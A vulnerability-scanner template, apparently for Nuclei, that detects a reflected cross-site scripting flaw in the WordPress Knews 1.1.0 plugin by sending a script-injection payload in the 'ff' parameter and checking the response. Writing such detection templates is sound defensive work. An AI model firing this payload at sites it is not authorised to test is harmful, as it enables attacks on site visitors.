id: wp-knews-xss

info:
  name: WordPress Knews Multilingual Newsletters 1.1.0 - 跨站脚本漏洞
  author: daffainfo
  severity: high
  description: WordPress Knews Multilingual Newsletters 1.1.0 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  reference:
    - http://web.archive.org/web/20210213220043/https://www.securityfocus.com/bid/54330/info
    - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-knews-multilingual-newsletters-ff-parameter-cross-site-scripting-1-1-0
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  metadata:
    max-request: 2
  tags: wordpress,xss,wp-plugin,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/knews/readme.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        internal: true
        words:
          - 'Knews Multilingual Newsletters'

  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/knews/wysiwyg/fontpicker/?ff=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "</script><script>alert(document.domain)</script>"
        part: body

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
